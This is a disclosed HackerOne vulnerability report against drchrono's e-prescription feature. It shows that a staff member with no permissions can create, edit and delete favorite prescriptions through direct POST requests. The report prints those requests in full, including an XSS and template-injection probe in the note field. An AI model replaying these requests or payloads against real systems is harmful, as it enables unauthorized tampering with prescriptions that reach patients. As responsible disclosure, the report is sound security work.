# User with no permissions can create, edit, delete favorite prescriptions /erx/

## Report Details
- **Report ID**: 142101
- **URL**: https://hackerone.com/reports/142101
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-30T17:50:41.511Z
- **Disclosed**: 2016-11-25T16:00:43.407Z

## Reporter
- **Username**: yaworsk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: drchrono

## Vulnerability Information
Hi All,
I believe I've found a vulnerability with regards to creating, editing and deleting favorite prescriptions.

##Description
I have a doctor's organization with a staff member who has no permissions. If I visit ```https://1337test.drchrono.com/erx/``` I get permission denied. However, I can create, edit and delete favorites by making the appropriate POST call:

###Create
```
POST /erx/favorites/save_prescription/ HTTP/1.1
Host: 1337test.drchrono.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
X-NewRelic-ID: VQYOWFNSGwcJVVhSAQ==
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-CSRFToken: Ty5kAW6cbjyRwTP0m5275oki638NFHal
Referer: https://1337test.drchrono.com
Content-Length: 1174
Cookie: REDACTED
Connection: close

data=%7B%22refills%22%3A%221%22%2C%22freetext%22%3A%22apply%20milligram(s)%20implant%203%20times%20a%20day%20as%20needed%20%20x2%20doses%20%22%2C%22sigtype%22%3A%22freetext%22%2C%22dispense%22%3A1%2C%22route%22%3A%22ophthalmic%22%2C%22drug_id%22%3A%22d01219%22%2C%22note%22%3A%22%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%5B%5B5*5%5D%5D%22%2C%22doseform%22%3A%22test%22%2C%22drug_search%22%3A%22BioGlo%201%20mg%20ophthalmic%20test%22%2C%22frequency%22%3A%22%22%2C%22sig%22%3A%22apply%20milligram(s)%20implant%203%20times%20a%20day%20as%20needed%20%20x2%20doses%20%22%2C%22dispense_as_written%22%3Afalse%2C%22genproduct_id%22%3A3207%2C%22ncit_code%22%3A%22C28253%22%2C%22unit_display%22%3A%22milligram(s)%22%2C%22pkg_product_id%22%3A%2217238090011%22%2C%22dosage%22%3A%221.000%20milligram(s)%22%2C%22drugtype_choice%22%3A0%2C%22drugtype%22%3A%22%22%2C%22patient_instructions%22%3A%7B%22dose%22%3A%22apply%22%2C%22unit%22%3A%22milligram(s)%22%2C%22route%22%3A%22implant%22%2C%22frequency%22%3A%223%20times%20a%20day%22%2C%22frequency_time%22%3A%22as%20needed%20%22%2C%22duration%22%3A%22x2%20doses%22%2C%22as_needed%22%3Afalse%7D%2C%22brand_name%22%3Atrue%2C%22otc%22%3Afalse%7D
```

###Edit
```
POST /erx/favorites/save_prescription/64808/ HTTP/1.1
Host: 1337test.drchrono.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
X-NewRelic-ID: VQYOWFNSGwcJVVhSAQ==
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-CSRFToken: Ty5kAW6cbjyRwTP0m5275oki638NFHal
Referer: https://1337test.drchrono.com
Content-Length: 1177
Cookie: REDACTED
Connection: close

data=%7B%22refills%22%3A%2299%22%2C%22freetext%22%3A%22apply%20milligram(s)%20implant%203%20times%20a%20day%20as%20needed%20%20x2%20doses%20%22%2C%22sigtype%22%3A%22freetext%22%2C%22dispense%22%3A1%2C%22route%22%3A%22ophthalmic%22%2C%22drug_id%22%3A%22d01219%22%2C%22note%22%3A%22%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%5B%5B5*5%5D%5D%22%2C%22doseform%22%3A%22test%22%2C%22drug_search%22%3A%22BioGlo%201%20mg%20ophthalmic%20test%22%2C%22frequency%22%3A%22%22%2C%22sig%22%3A%22apply%20milligram(s)%20implant%203%20times%20a%20day%20as%20needed%20%20x2%20doses%20%22%2C%22dispense_as_written%22%3Afalse%2C%22genproduct_id%22%3A3207%2C%22ncit_code%22%3A%22C28253%22%2C%22unit_display%22%3A%22milligram(s)%22%2C%22pkg_product_id%22%3A%2217238090011%22%2C%22dosage%22%3A%221.000%20milligram(s)%22%2C%22drugtype_choice%22%3A0%2C%22drugtype%22%3A%22SI%22%2C%22patient_instructions%22%3A%7B%22frequency_time%22%3A%22as%20needed%20%22%2C%22route%22%3A%22implant%22%2C%22dose%22%3A%22apply%22%2C%22frequency%22%3A%223%20times%20a%20day%22%2C%22duration%22%3A%22x2%20doses%22%2C%22as_needed%22%3Afalse%2C%22unit%22%3A%22milligram(s)%22%7D%2C%22brand_name%22%3Atrue%2C%22otc%22%3Afalse%7D
```

###Delete
```
POST /erx/favorites/delete_prescription/ HTTP/1.1
Host: 1337test.drchrono.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
X-NewRelic-ID: VQYOWFNSGwcJVVhSAQ==
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-CSRFToken: Ty5kAW6cbjyRwTP0m5275oki638NFHal
Referer: https://1337test.drchrono.com
Content-Length: 8
Cookie: REDACTED
Connection: close

id=64810
```

##Steps to reproduce
1. Create a doctors organization
2. Create a staff member with no permissions
3. Logout and log in as the staff member with no permissions
4. Replicated the calls above substituting your cookies, CSRF, etc.

##Vulnerability
This is another permission by pass. However, the most severe potential I see here is the ability for an attacker to modify a favorite which a doctor doesn't realize and then uses to prescribe to a patient.

Please let me know if you have any questions.
Pete

## Attachments
No attachments
